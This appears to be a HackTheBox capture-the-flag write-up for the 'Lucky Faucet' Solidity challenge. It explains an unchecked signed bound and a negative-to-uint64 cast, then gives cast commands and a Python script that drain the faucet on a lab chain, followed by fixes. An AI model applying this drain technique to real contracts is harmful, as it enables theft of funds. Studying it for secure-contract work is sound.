---
title: "Lucky Faucet"
date: 2027-10-15 09:00:00 -0500
categories: [HackTheBox, Challenges, Blockchain]
tags: [hackthebox, challenge, blockchain, solidity, smart-contract, integer-overflow, type-confusion, foundry]
description: "An Easy blockchain challenge where a faucet caps its payouts with a signed integer but only ever validates the top of the range. Setting the lower bound negative slips past every check, and a careless narrowing cast turns that negative value into the maximum possible payout — draining ~18.45 ETH in a single transaction."
---

## Overview

`Lucky Faucet` is an Easy HackTheBox **Blockchain** challenge. You're given two short Solidity files — `LuckyFaucet.sol` and `Setup.sol` — and a live instance running an [anvil](https://book.getfoundry.sh/anvil/) chain plus a small TCP handler that hands out your player keys and the flag. The faucet is meant to dribble out 50–100 million wei at a time, but a [numeric truncation error](https://cwe.mitre.org/data/definitions/197.html) lets us empty it in one call. The win condition is simply to drain at least 10 ETH from the faucet's 500 ETH balance.

## The technique

The faucet stores its payout range in two **signed** `int64` variables and lets anyone change them:

```solidity
int64 public upperBound;
int64 public lowerBound;

function setBounds(int64 _newLowerBound, int64 _newUpperBound) public {
    require(_newUpperBound <= 100_000_000, "100M wei is the max upperBound sry");
    require(_newLowerBound <=  50_000_000, "50M wei is the max lowerBound sry");
    require(_newLowerBound <= _newUpperBound);
    upperBound = _newUpperBound;
    lowerBound = _newLowerBound;
}

function sendRandomETH() public returns (bool, uint64) {
    int256 randomInt = int256(blockhash(block.number - 1));
    uint64 amountToSend = uint64(randomInt % (upperBound - lowerBound + 1) + lowerBound);
    bool sent = msg.sender.send(amountToSend);
    return (sent, amountToSend);
}
```

Two mistakes stack on top of each other:

1. **Only the upper edge of each bound is validated.** `require(_newLowerBound <= 50_000_000)` is happily satisfied by *any* negative number. Because the bounds are *signed*, nothing stops `lowerBound = -1`. The author was guarding against the range being too *big*, and forgot it could be made arbitrarily *small*.

2. **A negative `int` is cast straight to `uint64`.** This contract targets Solidity 0.7.6, where a narrowing / sign-changing cast does **not** revert — it just reinterprets the low bits. `uint64(-1)` becomes `0xFFFFFFFFFFFFFFFF` = `2^64 - 1` wei ≈ **18.45 ETH**.

To make the payout deterministic (so we don't depend on the blockhash), collapse the range by setting `lowerBound == upperBound == -1`:

```
randomInt % (upperBound - lowerBound + 1) + lowerBound
= randomInt % (-1 - (-1) + 1) + (-1)
= randomInt % 1 + (-1)
= 0 - 1
= -1
```

So `amountToSend = uint64(-1)` on every call, regardless of the random value. One `sendRandomETH()` sends ~18.45 ETH out of the faucet — far more than the 10 ETH needed to solve.

## Solution

The instance exposes two TCP ports: one is the anvil JSON-RPC endpoint (`{"method":"web3_clientVersion"}` returns `anvil/...`), the other is a tiny menu that prints your **private key**, your **address**, and the **Target** and **Setup** contract addresses. Option `3` returns the flag once the faucet is drained.

With those values, the whole solve is two transactions and a check, using Foundry's `cast`:

```bash
RPC=http://<ip>:<rpc_port>
PK=<player private key from the handler>
TARGET=<target contract from the handler>
SETUP=<setup contract from the handler>

# 1. collapse the range to a fixed, negative payout
cast send --rpc-url $RPC --private-key $PK $TARGET "setBounds(int64,int64)" -- -1 -1

# 2. one call drains uint64(-1) wei ~= 18.45 ETH
cast send --rpc-url $RPC --private-key $PK $TARGET "sendRandomETH()"

# 3. verify the win condition
cast call $SETUP "isSolved()(bool)" --rpc-url $RPC     # -> true
```

The biggest time-sink here is a `cast` quirk, not the contract: the `--` is required so the negative literals `-1 -1` aren't parsed as flags, which means `--rpc-url` and `--private-key` **must** come *before* the `--`. Put them after and `cast` silently falls back to its default `http://localhost:8545`, your transaction goes nowhere, and the bounds never change.

The same logic as a standalone script:

```python
#!/usr/bin/env python3
import sys, subprocess

def cast(*args):
    return subprocess.run(["cast", *args], capture_output=True, text=True).stdout.strip()

def main():
    rpc, pk, target, setup = sys.argv[1:5]
    print("[*] balance before:", cast("balance", target, "--rpc-url", rpc))
    cast("send", "--rpc-url", rpc, "--private-key", pk, target,
         "setBounds(int64,int64)", "--", "-1", "-1")
    cast("send", "--rpc-url", rpc, "--private-key", pk, target, "sendRandomETH()")
    print("[*] balance after:", cast("balance", target, "--rpc-url", rpc))
    print("[+] isSolved:", cast("call", setup, "isSolved()(bool)", "--rpc-url", rpc))

if __name__ == "__main__":
    main()
```

Once `isSolved()` returns `true`, the handler's option `3` returns the flag: `HTB{...}`.

## Why it worked

This is a [numeric truncation error](https://cwe.mitre.org/data/definitions/197.html) layered on top of [improper input validation](https://cwe.mitre.org/data/definitions/20.html). The signed lower bound was never constrained below zero, so a negative value passed every `require`. That negative value then flowed into `uint64(...)`, and on Solidity <0.8 a sign-changing narrowing cast silently wraps instead of reverting — turning `-1` into the maximum `uint64`. It's a close cousin of the classic ERC-20 `uint256` underflow, except the overflow happens in the **cast**, not in the arithmetic.

## Fix / defense

- **Validate both edges of every bound:** `require(_lo >= MIN && _hi <= MAX && _lo <= _hi)`.
- **Use unsigned types** for quantities that can never be negative — then `-1` can't even be encoded as input.
- **Upgrade to Solidity ≥0.8** and cast with OpenZeppelin's `SafeCast.toUint64(...)`: a negative or out-of-range value reverts instead of silently wrapping to `2^64 - 1`.
